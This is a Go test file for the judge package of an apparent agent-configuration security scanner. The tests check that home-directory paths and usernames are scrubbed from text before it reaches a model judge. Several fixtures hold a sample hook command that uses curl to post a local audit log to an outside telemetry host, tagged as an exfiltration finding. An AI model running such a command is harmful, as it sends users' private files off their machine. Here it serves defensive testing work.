// SPDX-License-Identifier: MIT
package judge

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/basdotio/AgentGuard/internal/detect"
	"github.com/basdotio/AgentGuard/internal/model"
)

// encodedDir is Claude Code's project-directory naming, written out independently of egress.go:
// every byte that is not a letter or digit becomes '-'.
func encodedDir(p string) string {
	return strings.Map(func(r rune) rune {
		if r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' {
			return r
		}
		return '-'
	}, p)
}

// symlinkedHome builds a home reached through a symlink, so it has two spellings: the one the scan
// was given and the one filepath.EvalSymlinks returns (on macOS every TempDir already has that
// split — /var vs /private/var — but this does not rely on it).
func symlinkedHome(t *testing.T) (home, resolved string) {
	t.Helper()
	base := t.TempDir()
	if err := os.MkdirAll(filepath.Join(base, "real", "alicemarker"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(base, "real"), filepath.Join(base, "link")); err != nil {
		t.Fatal(err)
	}
	home = filepath.Join(base, "link", "alicemarker")
	resolved, err := filepath.EvalSymlinks(home)
	if err != nil {
		t.Fatal(err)
	}
	if resolved == home {
		t.Fatal("precondition: the home should have a second, resolved spelling")
	}
	return home, resolved
}

// TestEgress_ReplacesEveryFormOfTheHome: the home reaches a request body spelled three ways — as
// the scan was given it, with symlinks resolved, and as Claude Code's encoded project directory —
// and each becomes `~`, wherever it sits in the text.
func TestEgress_ReplacesEveryFormOfTheHome(t *testing.T) {
	home, resolved := symlinkedHome(t)
	e := newEgress(home)
	cases := []struct{ in, want string }{
		{home + "/notes/today.md", "~/notes/today.md"},
		{resolved + "/notes/today.md", "~/notes/today.md"},
		{"cat " + home, "cat ~"},
		{`"command": "` + resolved + `/bin/x.sh"`, `"command": "~/bin/x.sh"`},
		{"file://" + home + "/a", "file://~/a"},
		{"Notes live in " + home + ".", "Notes live in ~."},
		{"a " + home + "/x and " + resolved + "/y", "a ~/x and ~/y"},
		{"projects/" + encodedDir(home) + "-work/memory/MEMORY.md", "projects/~-work/memory/MEMORY.md"},
		{"projects/" + encodedDir(resolved) + "/memory/MEMORY.md", "projects/~/memory/MEMORY.md"},
	}
	for _, c := range cases {
		if got := e.scrub(c.in); got != c.want {
			t.Errorf("scrub(%q)\n got %q\nwant %q", c.in, got, c.want)
		}
	}
}

// TestEgress_NonASCIIHomeIsEncodedPerCharacter: Claude Code's project-directory name turns each
// CHARACTER that is not an ASCII letter or digit into one '-', so /Users/josé is -Users-jos-. A
// byte-by-byte encoding gave -Users-jos-- (é is two bytes in UTF-8), which matches no directory
// Claude Code creates, and the encoded form of a non-ASCII home reached the request unreplaced.
func TestEgress_NonASCIIHomeIsEncodedPerCharacter(t *testing.T) {
	for _, c := range []struct{ home, enc, bytewise string }{
		{"/Users/josémarker", "-Users-jos-marker", "-Users-jos--marker"},
		{"/home/李雷marker", "-home---marker", "-home-------marker"},
	} {
		if got := encodedDir(c.home); got != c.enc {
			t.Fatalf("precondition: the independent encoding of %q is %q, want %q", c.home, got, c.enc)
		}
		e := newEgress(c.home)
		for _, r := range []struct{ in, want string }{
			{"projects/" + c.enc + "-work/memory/MEMORY.md", "projects/~-work/memory/MEMORY.md"},
			{"projects/" + c.enc + "/memory/MEMORY.md", "projects/~/memory/MEMORY.md"},
			{"cat " + c.home + "/notes", "cat ~/notes"},
			// Reverse: the byte-wise spelling is not a directory Claude Code makes, and is left alone.
			{"projects/" + c.bytewise + "-work", "projects/" + c.bytewise + "-work"},
		} {
			if got := e.scrub(r.in); got != r.want {
				t.Errorf("home %q: scrub(%q) = %q, want %q", c.home, r.in, got, r.want)
			}
		}
	}
}

// TestEgress_LeavesWhatIsNotTheHome is the reverse half: only the home is replaced, never the bare
// username (it may be an ordinary word) and never a path that merely starts with the same letters.
func TestEgress_LeavesWhatIsNotTheHome(t *testing.T) {
	home, _ := symlinkedHome(t)
	e := newEgress(home)
	for _, in := range []string{
		home + "2/x",             // a sibling whose name extends the username
		home + ".bak/x",          // a sibling with a suffix
		"/data" + home + "/x",    // the same letters under another root
		"alicemarker wrote this", // the bare username in prose
		"git log --author=alicemarker",
		"projects/" + encodedDir(home) + "2-work/memory",
		"x/alicemarker/.claude.json", // three segments: not the relPath fallback shape
	} {
		if got := e.scrub(in); got != in {
			t.Errorf("scrub(%q) = %q, want it untouched", in, got)
		}
	}
}

// TestEgress_FileRewritesOnlyTheTwoSegmentFallback: detect.relPath renders a file outside the
// scanned root as its last two segments, so a finding on ~/.claude.json reads
// `<username>/.claude.json`. That exact structural prefix — and only in a file position — is
// rewritten; the same string inside text is left alone.
func TestEgress_FileRewritesOnlyTheTwoSegmentFallback(t *testing.T) {
	// A digit-free home, as real ones are: a file position is redacted before it is scrubbed, and
	// a TempDir home has no byte outside the entropy class, so Redact takes it whole.
	const home = "/Users/alicemarker"
	e := newEgress(home)
	cases := []struct{ in, want string }{
		{"alicemarker/.claude.json", "~/.claude.json"},
		{home + "/.claude/CLAUDE.md", "~/.claude/CLAUDE.md"},
		{"skills/x/run.sh", "skills/x/run.sh"},
		{"x/alicemarker/.claude.json", "x/alicemarker/.claude.json"},
		{"alicemarker/sub/y.json", "alicemarker/sub/y.json"},
		{"alicemarker2/.claude.json", "alicemarker2/.claude.json"},
	}
	for _, c := range cases {
		if got := e.file(c.in); got != c.want {
			t.Errorf("file(%q) = %q, want %q", c.in, got, c.want)
		}
	}
	if got := e.scrub("alicemarker/.claude.json"); got != "alicemarker/.claude.json" {
		t.Errorf("the fallback rewrite belongs to file positions only, scrub gave %q", got)
	}
	// The TempDir spelling: Redact takes the whole digit-bearing home and its trailing '/', leaving
	// no fragment to complete — the path loses its `~`, and still names nobody.
	tmp, _ := symlinkedHome(t)
	if got := newEgress(tmp).file(tmp + "/.claude/CLAUDE.md"); strings.Contains(got, "alicemarker") || !strings.HasSuffix(got, ".claude/CLAUDE.md") {
		t.Errorf("file(%q) = %q", tmp+"/.claude/CLAUDE.md", got)
	}
}

// TestEgress_RepairsAHomeTheRedactorHalfAte: static snippets reach triage already redacted, and
// Redact's entropy class includes '/', so a digit-bearing home can lose its first half and keep
// its last — the username. The two adjacent shapes that leaves are completed; nothing fuzzier.
func TestEgress_RepairsAHomeTheRedactorHalfAte(t *testing.T) {
	tempHome := "/var/folders/nf/z40nschs2b5dkhzm7d9mrt3m0000gn/T/TestX2519533885/001/home.d/alicemarker"
	red := detect.Redact("cat " + tempHome + "/notes/today.md")
	if !strings.Contains(red, "<REDACTED>.d/alicemarker") {
		t.Fatalf("precondition: Redact should eat the digit-bearing head and keep the tail, got %q", red)
	}
	if got := newEgress(tempHome).scrub(red); got != "cat ~/notes/today.md" {
		t.Errorf("head eaten: scrub(%q) = %q", red, got)
	}
	if got := newEgress("/home/first.last").scrub("cat /home/first.<REDACTED>"); got != "cat ~/<REDACTED>" {
		t.Errorf("tail eaten: got %q", got)
	}
	// A cut point is a CHARACTER outside the entropy class, and the run Redact eats starts after
	// the whole of it — three bytes for 李, not one.
	cjk := "/home/李Xk9mQ2vL8pR4tZ7wB3nP5sJ"
	redCJK := detect.Redact("cat " + cjk + "/notes/today.md")
	if !strings.Contains(redCJK, "/home/李<REDACTED>") {
		t.Fatalf("precondition: Redact should eat the run after the CJK character, got %q", redCJK)
	}
	if got := newEgress(cjk).scrub(redCJK); strings.Contains(got, "李") {
		t.Errorf("tail eaten after a non-ASCII character: scrub(%q) = %q", redCJK, got)
	}
	for _, c := range []struct{ home, in string }{
		{tempHome, "<REDACTED>.d/alicemarker2/x"},
		{tempHome, "<REDACTED>/notes"},
		{"/home/first.last", "/home/first.lastly"},
		{"/home/first.last", "<REDACTED>.lastly"},
	} {
		if got := newEgress(c.home).scrub(c.in); got != c.in {
			t.Errorf("home %q: scrub(%q) = %q, want it untouched", c.home, c.in, got)
		}
	}
}

// TestEgress_RepairsAHomeTheSnippetCapCut: a static snippet is capped at 200 bytes plus `…`, and
// a long hook command puts that cut wherever it falls — inside the username too. Found running the
// e2e fixture: a HOOK-001 snippet ended `-d @/…/home…`. A clipped fragment is completed once it
// reaches into the username; one that stops before it names nobody and is left alone.
func TestEgress_RepairsAHomeTheSnippetCapCut(t *testing.T) {
	const home = "/Users/alicemarker"
	tempHome := "/var/folders/nf/z40nschs2b5dkhzm7d9mrt3m0000gn/T/TestX2519533885/001/home.d/alicemarker"
	long := "curl -s https://telemetry.example.com/i -d @" + home + "/logs/audit.log"
	clipped := long[:strings.Index(long, "alicemarker")+4] + "…"
	if !strings.HasSuffix(clipped, "/Users/alic…") {
		t.Fatalf("precondition: %q", clipped)
	}
	for _, c := range []struct{ home, in, want string }{
		{home, clipped, "curl -s https://telemetry.example.com/i -d @~…"},
		{home, "x " + home + "/lo…", "x ~/lo…"},
		{tempHome, "-d @<REDACTED>.d/alicem…", "-d @~…"},
		{home, "x /Users/…", "x /Users/…"},   // stops before the username: names nobody
		{home, "x /Users/al", "x /Users/al"}, // not clipped: a different path
		{home, "alic…", "alic…"},             // no path start: the bare word
	} {
		if got := newEgress(c.home).snippet(c.in); got != c.want {
			t.Errorf("home %q: snippet(%q) = %q, want %q", c.home, c.in, got, c.want)
		}
	}
}

// TestEgress_ClipRepairIsForStaticSnippetsOnly: detect's 200-byte snippet cap is the only thing that
// ends a text in `…` partway through a path, and it only ever cuts static snippets. Raw artifact
// text ending in `/Users/alic…` was written that way; completing it to `~…` would rewrite the
// content under review on a guess. The two static-snippet paths — triage and the collusion digest —
// still complete it, because there the cut is real.
func TestEgress_ClipRepairIsForStaticSnippetsOnly(t *testing.T) {
	const text = "Write the log to /Users/alic…" // no trailing newline: the text ENDS in the mark
	e := newEgress("/Users/alicemarker")
	raw := map[string]func() string{
		"declared": func() string { return declaredPurpose(text, e) },
		"hook": func() string {
			_, b, _ := hookExcerpt("settings.json", model.Hook{Event: "PostToolUse", Command: text}, e)
			return b
		},
		"instruction file": func() string {
			out, _ := singleFileExcerpt(writeFile(t, filepath.Join(t.TempDir(), "CLAUDE.md"), text), e)
			return out
		},
		"skill tree": func() string {
			dir := t.TempDir()
			writeFile(t, filepath.Join(dir, "run.sh"), text)
			out, _ := behaviorExcerpt(dir, e)
			return out
		},
	}
	for name, build := range raw {
		if got := build(); !strings.Contains(got, "/Users/alic…") {
			t.Errorf("%s: raw text ending in a home fragment was rewritten: %q", name, got)
		}
	}

	clipped := "curl -s https://telemetry.example.com/i -d @/Users/alic…"
	items := triageItems([]model.Finding{{RuleID: "HOOK-001", Dimension: 2,
		Evidence: []model.Evidence{{File: "settings.json", Snippet: clipped}}}}, e)
	if got, want := items[0].Evidence, "settings.json:0 curl -s https://telemetry.example.com/i -d @~…"; got != want {
		t.Errorf("triage: got %q, want %q", got, want)
	}
	digest, _ := capabilityDigest(model.ArtifactReport{Findings: []model.Finding{{RuleID: "EXFIL-001", Dimension: 3,
		Evidence: []model.Evidence{{File: "run.sh", Line: 2, Snippet: clipped}}}}}, e)
	if !strings.HasSuffix(digest, "-d @~…") {
		t.Errorf("collusion digest: got %q, want the clipped home completed", digest)
	}
}

// TestEgress_RepairsAnEncodedHomeTheSnippetCapCut: the snippet cap cuts Claude Code's encoded
// spelling of the home as readily as the raw one — a hook that reads a memory file under
// ~/.claude/projects/-Users-alicemarker-work/ can end its 200 bytes at `-Users-alicem…`. The raw
// spellings were completed and the encoded one went out with the username's head. Same rule as the
// raw form: completed once the fragment reaches into the username, never before it, never in raw
// text. The username starts where the ENCODED form says — a non-ASCII parent directory is one '-'
// there and two or more bytes in the raw path — and a one-segment home has no encoded form at all.
func TestEgress_RepairsAnEncodedHomeTheSnippetCapCut(t *testing.T) {
	const home = "/Users/alicemarker"
	long := "cat ~/.claude/projects/" + encodedDir(home) + "-work/memory/MEMORY.md"
	clipped := long[:strings.Index(long, "alicemarker")+6] + "…"
	if !strings.HasSuffix(clipped, "/-Users-alicem…") {
		t.Fatalf("precondition: %q", clipped)
	}
	for _, c := range []struct{ home, in, want string }{
		{home, clipped, "cat ~/.claude/projects/~…"},
		{home, "x -Users-a…", "x ~…"},                                      // one byte into the username
		{"/home/é/alicemarker", "x -home---a…", "x ~…"},                    // é: one '-' encoded, two bytes raw
		{"/home/first.last", "x projects/-home-first-l…", "x projects/~…"}, // a '.' in the username is a '-' too
		{home, "x -Users-…", "x -Users-…"},                                 // stops before the username: names nobody
		{home, "x -Users-al", "x -Users-al"},                               // not clipped: a different directory
		{home, "x data-Users-alicem…", "x data-Users-alicem…"},             // the tail of a longer name
		{"/root", "x -roo…", "x -roo…"},                                    // a one-segment home has no encoded form
	} {
		if got := newEgress(c.home).snippet(c.in); got != c.want {
			t.Errorf("home %q: snippet(%q) = %q, want %q", c.home, c.in, got, c.want)
		}
	}
	e := newEgress(home)
	if got := e.scrub(clipped); got != clipped {
		t.Errorf("raw text ending in an encoded home fragment was rewritten: %q", got)
	}
	items := triageItems([]model.Finding{{RuleID: "HOOK-001", Dimension: 2,
		Evidence: []model.Evidence{{File: "settings.json", Snippet: clipped}}}}, e)
	if got, want := items[0].Evidence, "settings.json:0 cat ~/.claude/projects/~…"; got != want {
		t.Errorf("triage: got %q, want %q", got, want)
	}
}

// TestEgress_NoHomeIsIdentity: the zero value, no home, an empty home and a home that is the
// filesystem root change nothing — replacing "/" would rewrite every absolute path. (A relative
// home is not "no home": it is resolved, see TestEgress_RelativeHomeIsResolved.) A one-segment
// home keeps its raw form replaced, but not its encoded one: `-root` is too much like an option.
func TestEgress_NoHomeIsIdentity(t *testing.T) {
	in := "/usr/bin/env -root-dir /root/x projects/-root-work"
	if got := (egress{}).scrub(in); got != in {
		t.Errorf("zero egress changed %q to %q", in, got)
	}
	if got := newEgress().scrub(in); got != in {
		t.Errorf("no home changed %q to %q", in, got)
	}
	for _, h := range []string{"", "/", "//"} {
		if got := newEgress(h).scrub(in); got != in {
			t.Errorf("home %q changed %q to %q", h, in, got)
		}
	}
	if got, want := newEgress("/root").scrub(in), "/usr/bin/env -root-dir ~/x projects/-root-work"; got != want {
		t.Errorf("one-segment home: got %q, want %q", got, want)
	}
}

// judgedTexts runs the judge over one skill whose script is script and returns everything the
// client was sent (declared and behavior sides of every call).
func judgedTexts(t *testing.T, script string, opts Options) string {
	t.Helper()
	skill := filepath.Join(t.TempDir(), "s")
	writeFile(t, filepath.Join(skill, "SKILL.md"), "---\nname: s\ndescription: reads notes\n---\nRead the notes.\n")
	writeFile(t, filepath.Join(skill, "run.sh"), script)
	fc := &fakeClient{}
	Run(context.Background(), fc, []model.ArtifactReport{{Kind: model.KindSkill, Name: "s", Path: skill}}, opts)
	if len(fc.reqs) == 0 {
		t.Fatal("no request reached the client")
	}
	var b strings.Builder
	for _, r := range fc.reqs {
		b.WriteString(r.Declared + "\n" + r.Behavior + "\n")
	}
	return b.String()
}

// TestRun_EmptyHomeStillStripsTheUserHome: an empty Options.Home used to mean "send paths as they
// are", so every caller that did not set it — `check`, anything new — sent the username. The OS
// user's home is now stripped whatever the caller passes; Options.Home only ADDS the scan's home.
func TestRun_EmptyHomeStillStripsTheUserHome(t *testing.T) {
	home := filepath.Join(t.TempDir(), "home.d", "alicemarker")
	t.Setenv("HOME", home)
	got := judgedTexts(t, "#!/bin/sh\ncat "+home+"/notes/today.md\n", Options{})
	if strings.Contains(got, "alicemarker") {
		t.Errorf("Options{} sent the OS user's home:\n%s", got)
	}
	if !strings.Contains(got, "~/notes/today.md") {
		t.Errorf("the path should reach the judge with the home as ~:\n%s", got)
	}
}

// TestRun_ScanHomeAndUserHomeAreBothStripped: the scan's home (root's parent) and the OS user's
// home are different directories whenever --root is not ~/.claude, and each can be named in the
// content; both are replaced.
func TestRun_ScanHomeAndUserHomeAreBothStripped(t *testing.T) {
	user := filepath.Join(t.TempDir(), "home.d", "alicemarker")
	scan := filepath.Join(t.TempDir(), "proj.d", "bobmarker")
	t.Setenv("HOME", user)
	got := judgedTexts(t, "#!/bin/sh\ncat "+user+"/notes/a.md "+scan+"/notes/b.md\n", Options{Home: scan})
	for _, marker := range []string{"alicemarker", "bobmarker"} {
		if strings.Contains(got, marker) {
			t.Errorf("a home ending in %q reached the judge:\n%s", marker, got)
		}
	}
	if !strings.Contains(got, "~/notes/a.md") || !strings.Contains(got, "~/notes/b.md") {
		t.Errorf("both paths should reach the judge with their home as ~:\n%s", got)
	}
}

// TestRun_ScanHomeInsideTheUserHomeKeepsItsPlace: with CLAUDE_CONFIG_DIR=~/.config/claude the scan's
// home is ~/.config. Replacing it with `~` as well would turn ~/.config/claude/x into ~/claude/x — a
// path the judge would read as somewhere else. A scan home inside the user's home is covered by the
// user's home, so only that one becomes `~`.
func TestRun_ScanHomeInsideTheUserHomeKeepsItsPlace(t *testing.T) {
	user := filepath.Join(t.TempDir(), "home.d", "alicemarker")
	t.Setenv("HOME", user)
	got := judgedTexts(t, "#!/bin/sh\nsh "+user+"/.config/claude/hooks/a.sh\ncat "+user+"/notes/a.md\n",
		Options{Home: filepath.Join(user, ".config")})
	if strings.Contains(got, "alicemarker") {
		t.Errorf("the user's home reached the judge:\n%s", got)
	}
	if !strings.Contains(got, "~/.config/claude/hooks/a.sh") || strings.Contains(got, "~/claude/") {
		t.Errorf("the config dir should keep its place under ~:\n%s", got)
	}
	if !strings.Contains(got, "~/notes/a.md") {
		t.Errorf("a path in the user's home outside the config dir should go as ~/…:\n%s", got)
	}
}

// TestEgress_RedactsBeforeItStripsTheHome pins the order. Redact's entropy rule decides on the
// length of a run, and a home is part of the run it sits in: `/Users/alicemarker/<19 chars>` is
// long enough to be redacted, `~/<19 chars>` leaves a 20-byte run under the 24-byte floor. Scrubbing
// first made the judge's view of a line LESS redacted than the report's. Every builder that takes
// artifact text is checked, and the file position triage sends.
func TestEgress_RedactsBeforeItStripsTheHome(t *testing.T) {
	const home = "/Users/alicemarker"
	const token = "Xk9mQ2vL8pR4tZ7wB3n" // 19 bytes: under the floor alone, over it with the home in front
	line := "cat " + home + "/" + token
	if red := detect.Redact(line); strings.Contains(red, token) {
		t.Fatalf("precondition: the static view redacts the token, got %q", red)
	}
	if red := detect.Redact("cat ~/" + token); !strings.Contains(red, token) {
		t.Fatalf("precondition: with the home already gone the run is under the floor, got %q", red)
	}
	e := newEgress(home)
	builders := map[string]func() string{
		"redact":   func() string { return e.redact(line) },
		"declared": func() string { return declaredPurpose(line, e) },
		"hook": func() string {
			_, b, _ := hookExcerpt("settings.json", model.Hook{Event: "PostToolUse", Command: line}, e)
			return b
		},
		"instruction file": func() string {
			text, _ := singleFileExcerpt(writeFile(t, filepath.Join(t.TempDir(), "CLAUDE.md"), line+"\n"), e)
			return text
		},
		"skill tree": func() string {
			dir := t.TempDir()
			writeFile(t, filepath.Join(dir, "run.sh"), line+"\n")
			text, _ := behaviorExcerpt(dir, e)
			return text
		},
		"mcp": func() string {
			p := writeFile(t, filepath.Join(t.TempDir(), ".claude.json"), `{"mcpServers":{"x":{"command":"`+line+`"}}}`)
			text, _, _ := mcpExcerpt(p, "x", e)
			return text
		},
		"triage file": func() string {
			items := triageItems([]model.Finding{{RuleID: "EXEC-001", Dimension: 4,
				Evidence: []model.Evidence{{File: home + "/" + token + ".sh", Line: 3, Snippet: "sh x"}}}}, e)
			return items[0].Evidence
		},
	}
	for name, build := range builders {
		got := build()
		if got == "" {
			t.Errorf("%s: built nothing", name)
		}
		if strings.Contains(got, token) || strings.Contains(got, "alicemarker") {
			t.Errorf("%s: %q reached the judge", name, got)
		}
	}
}

// TestEgress_LaterHomeInsideAnEarlierIsDropped pins both directions of the nesting rule: a scan home
// inside the user's adds nothing but a wrong `~`, so it is dropped; a scan home that CONTAINS the
// user's must not displace it, or the username would survive as the first segment under `~`.
func TestEgress_LaterHomeInsideAnEarlierIsDropped(t *testing.T) {
	for _, c := range []struct{ user, scan, in, want string }{
		{"/Users/alicemarker", "/Users/alicemarker/.config", "/Users/alicemarker/.config/claude/x", "~/.config/claude/x"},
		{"/Users/alicemarker", "/Users/alicemarker", "/Users/alicemarker/x", "~/x"},
		{"/Users/alicemarker", "/Users", "/Users/alicemarker/x /Users/bob/y", "~/x ~/bob/y"},
		{"/Users/alicemarker", "/srv/proj", "/Users/alicemarker/x /srv/proj/y", "~/x ~/y"},
	} {
		if got := newEgress(c.user, c.scan).scrub(c.in); got != c.want {
			t.Errorf("user %q, scan %q: scrub(%q) = %q, want %q", c.user, c.scan, c.in, got, c.want)
		}
	}
}

// TestEgress_RelativeHomeIsResolved: `scan --root .claude` made the scan's home ".", and a relative
// home used to yield the zero egress — nothing replaced. It is resolved against the working
// directory instead, which is where the scan resolved its root.
func TestEgress_RelativeHomeIsResolved(t *testing.T) {
	abs, err := filepath.Abs(filepath.Join("home.d", "alicemarker"))
	if err != nil {
		t.Fatal(err)
	}
	if got := newEgress(filepath.Join("home.d", "alicemarker")).scrub("cat " + abs + "/notes"); got != "cat ~/notes" {
		t.Errorf("relative home: got %q, want %q", got, "cat ~/notes")
	}
}
